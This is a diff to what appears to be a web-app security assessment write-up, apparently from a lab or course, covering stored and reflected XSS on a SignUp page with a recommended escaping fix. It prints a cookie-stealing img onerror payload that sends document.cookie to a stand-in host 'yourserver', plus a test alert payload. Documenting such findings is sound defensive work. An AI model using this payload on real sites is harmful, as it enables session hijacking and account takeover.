@@ -27,7 +27,7 @@ The admin credentials could be stored in the database with the password salted +
 ## A3
 There are both Stored and Reflected XSS vulnerabilities. The Stored XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
 How (stored XSS): Enter this code into the address field on the SignUp page;
-<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>
+```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”. But you can also test with code like this, in any of the fields on the SignUp page; 
 <body onload=alert('hello')>
 Fix:  Html codes should be escaped using the htmlspecialchars or htmlentities PHP-functions + the input validated as tightly as possible (length, allowed characters, format etc.).
